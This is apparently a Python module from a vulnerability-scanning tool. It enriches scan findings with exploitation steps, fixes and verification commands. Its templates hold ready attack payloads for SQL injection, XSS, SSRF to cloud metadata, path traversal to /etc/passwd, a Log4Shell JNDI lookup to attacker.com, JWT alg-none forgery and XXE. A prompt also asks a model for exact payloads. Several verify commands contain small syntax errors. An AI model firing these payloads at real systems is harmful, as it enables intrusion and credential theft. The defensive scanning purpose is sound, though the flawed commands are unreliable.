import json
from typing import Any

from app.agents import Agent
from app.config import get_settings
from app.services.openrouter_client import call_openrouter


STATIC_TEMPLATES = {
    "sqli": {
        "exploitation_path": "Inject ' OR 1=1-- into login form. Use UNION SELECT to extract data: ' UNION SELECT username,password FROM users--. Time-based: ' AND SLEEP(5)--",
        "remediation_code": "# Use parameterized queries\ncursor.execute(\"SELECT * FROM users WHERE id = ?\", (user_id,))",
        "verify_command": "python -c \"import requests; r=requests.get('http://target/page?id=1\\'\\ AND\\ SLEEP(5)--'); print('Vulnerable' if r.elapsed.total_seconds()>4 else 'Patched')\""
    },
    "xss": {
        "exploitation_path": "Inject <script>alert(document.cookie)</script> into search field. For stored XSS, inject into comment/profile fields.",
        "remediation_code": "<!-- Escape output -->\n<%= escapeHtml(userInput) %>\n// React: {dangerouslySetInnerHTML} should never be used with unsanitized input",
        "verify_command": "curl -s 'http://target/search?q=<script>alert(1)</script>' | grep -i 'alert' && echo 'Vulnerable' || echo 'Patched'"
    },
    "ssrf": {
        "exploitation_path": "Submit http://169.254.169.254/latest/meta-data/ to URL input fields. Use file:///etc/passwd for protocol smuggling.",
        "remediation_code": "# Python allowlist approach\nALLOWED_DOMAINS = ['api.trusted.com']\nparsed = urlparse(user_url)\nif parsed.hostname not in ALLOWED_DOMAINS: raise ValueError('Blocked')",
        "verify_command": "curl -s 'http://target/fetch?url=http://169.254.169.254/' | grep -i 'ami-id' && echo 'Vulnerable' || echo 'Patched'"
    },
    "idor": {
        "exploitation_path": "Enumerate /api/users/1 through /api/users/50. Swap IDs between two authenticated sessions.",
        "remediation_code": "# Check object ownership\ndef get_user(user_id, current_user):\n    if user_id != current_user.id and not current_user.is_admin:\n        raise PermissionError()",
        "verify_command": "curl -s -b 'session=attacker' 'http://target/api/users/2' | grep -i 'admin' && echo 'Vulnerable' || echo 'Patched'"
    },
    "rce": {
        "exploitation_path": "Inject ; id or $(id) into command input fields. For Log4Shell: ${jndi:ldap://attacker.com/a} in User-Agent.",
        "remediation_code": "import subprocess\nsubprocess.run(['ls', '-l'], check=True)  # Use list form, never shell=True",
        "verify_command": "curl -s -H 'User-Agent: ${jndi:ldap://test}' 'http://target/' | grep -i 'ldap' && echo 'Vulnerable' || echo 'Patched'"
    },
    "lfi": {
        "exploitation_path": "Use ?page=../../../etc/passwd or double encoding: %252e%252e%252fetc%252fpasswd",
        "remediation_code": "import os\nBASE = '/var/www/pages/'\npath = os.path.normpath(os.path.join(BASE, user_input))\nif not path.startswith(BASE): raise ValueError('Path traversal')",
        "verify_command": "curl -s 'http://target/?page=../../../etc/passwd' | grep -q 'root:x:' && echo 'Vulnerable' || echo 'Patched'"
    },
    "open_redirect": {
        "exploitation_path": "Use //evil.com, https:evil.com, /%09//evil.com in redirect params (?next=, ?url=, ?redirect=)",
        "remediation_code": "# Python Flask safe redirect\nALLOWED = {'/dashboard', '/profile'}\nif target in ALLOWED: return redirect(target)\nelse: return redirect('/')",
        "verify_command": "curl -sI 'http://target/?redirect=//evil.com' | grep -i 'evil.com' && echo 'Vulnerable' || echo 'Patched'"
    },
    "cors": {
        "exploitation_path": "Send OPTIONS request with Origin: https://evil.com. If echoed with credentials, steal API responses.",
        "remediation_code": "# Nginx config\nadd_header Access-Control-Allow-Origin \"https://trusted.com\" always;\nadd_header Access-Control-Allow-Credentials \"true\" always;",
        "verify_command": "curl -s -H 'Origin: https://evil.com' -H 'Access-Control-Request-Method: GET' -X OPTIONS 'http://target/api/' -I | grep -i 'evil.com' && echo 'Vulnerable' || echo 'Patched'"
    },
    "csrf": {
        "exploitation_path": "Host form on attacker.com that auto-submits POST to target. Bypass with SameSite=None + Secure.",
        "remediation_code": "<form>\n  <input type=\"hidden\" name=\"csrf_token\" value=\"<%= csrf_token %>\">\n</form>\n# Server: validate token on every state-changing request",
        "verify_command": "curl -s -X POST 'http://target/api/action' -d 'data=test' | grep -i 'invalid.*token' && echo 'Protected' || echo 'Possibly Vulnerable'"
    },
    "jwt": {
        "exploitation_path": "Change alg to 'none', base64 encode header {\"alg\":\"none\"}.\nTry HS256->RS256 confusion using public key as HMAC secret.",
        "remediation_code": "// Use a library with algorithm validation\njwt.verify(token, secret, { algorithms: ['HS256'] })\n// Never accept 'none' algorithm",
        "verify_command": "python3 -c \"import jwt; t=jwt.encode({'sub':'admin'},'',algorithm='none'); print(t)\" && curl -s -b 'session='$t' http://target/admin' | head -c 200"
    },
    "xxe": {
        "exploitation_path": "Inject into XML upload:\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        "remediation_code": "from lxml import etree\nparser = etree.XMLParser(resolve_entities=False)\ntree = etree.fromstring(xml_data, parser)",
        "verify_command": "curl -s -X POST 'http/target/api/upload' -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>' | grep -q 'root:x:' && echo 'Vulnerable' || echo 'Patched'"
    },
    "ssti": {
        "exploitation_path": "Inject {{7*7}}, ${7*7}, <%= 7*7 %> in template fields. Confirm server-side evaluation with 49.",
        "remediation_code": "# Use auto-escaping templates\nfrom jinja2 import Environment, select_autoescape\nenv = Environment(autoescape=select_autoescape(['html', 'xml']))",
        "verify_command": "curl -s 'http://target/?name={{7*7}}' | grep -q '49' && echo 'Vulnerable' || echo 'Patched'"
    }
}


class AIExplainerAgent(Agent):
    def __init__(self) -> None:
        super().__init__("AI Explainer Agent")
        self.settings = get_settings()

    async def run(
        self, findings: list[dict[str, Any]], scan_id: int
    ) -> dict[str, list[dict[str, Any]]]:
        self.scan_id = scan_id
        self.status = "active"
        await self.log_action("started", f"Enriching {len(findings)} findings with AI")

        enriched: list[dict[str, Any]] = []
        for f in findings:
            sev = str(f.get("severity", "")).lower()
            if sev not in ("critical", "high"):
                enriched.append(f)
                continue
            e = await self._enrich(f)
            enriched.append(e)

        self.status = "complete"
        await self.log_action("completed", f"Enriched {len([e for e in enriched if 'exploitation_path' in e])} critical/high findings")
        return {"findings": enriched}

    async def _enrich(self, finding: dict[str, Any]) -> dict[str, Any]:
        title = str(finding.get("title", ""))
        category = str(finding.get("category", "")).lower()
        tech = str(finding.get("endpoint", ""))

        template = self._find_template(title, category)
        if template:
            enriched = dict(finding)
            enriched["exploitation_path"] = template["exploitation_path"]
            enriched["remediation_code"] = template["remediation_code"]
            enriched["verify_command"] = template["verify_command"]
            return enriched

        system_prompt = "You are a senior penetration tester. Be technical, specific, no generic advice."
        user_prompt = (
            f"Vulnerability: {title} on {tech} stack.\n"
            f"1. Step-by-step exploitation (include exact payloads).\n"
            f"2. Exact remediation code/config.\n"
            f"3. One command to verify fix is applied."
        )

        result = await call_openrouter(
            user_prompt, system_prompt,
            scan_id=self.scan_id, max_tokens=1024
        )

        enriched = dict(finding)
        if result:
            parts = result.split("\n")
            e_path = ""
            rem_code = ""
            ver_cmd = ""
            current = ""
            for line in parts:
                if line.startswith("1.") or "exploitation" in line.lower():
                    current = "exp"
                    continue
                elif line.startswith("2.") or "remediation" in line.lower() or "fix" in line.lower():
                    current = "rem"
                    continue
                elif line.startswith("3.") or "verify" in line.lower() or "command" in line.lower():
                    current = "ver"
                    continue
                if current == "exp":
                    e_path += line + "\n"
                elif current == "rem":
                    rem_code += line + "\n"
                elif current == "ver":
                    ver_cmd += line + "\n"
            enriched["exploitation_path"] = e_path.strip()
            enriched["remediation_code"] = rem_code.strip()
            enriched["verify_command"] = ver_cmd.strip()
        else:
            enriched["exploitation_path"] = "AI enrichment unavailable; review manually"
            enriched["remediation_code"] = "Apply standard security patches for this vulnerability class"
            enriched["verify_command"] = "Run scan again after applying fixes"

        return enriched

    def _find_template(self, title: str, category: str) -> dict[str, str] | None:
        t = title.lower() + " " + category.lower()
        for key, tmpl in STATIC_TEMPLATES.items():
            if key in t:
                return tmpl
        return None
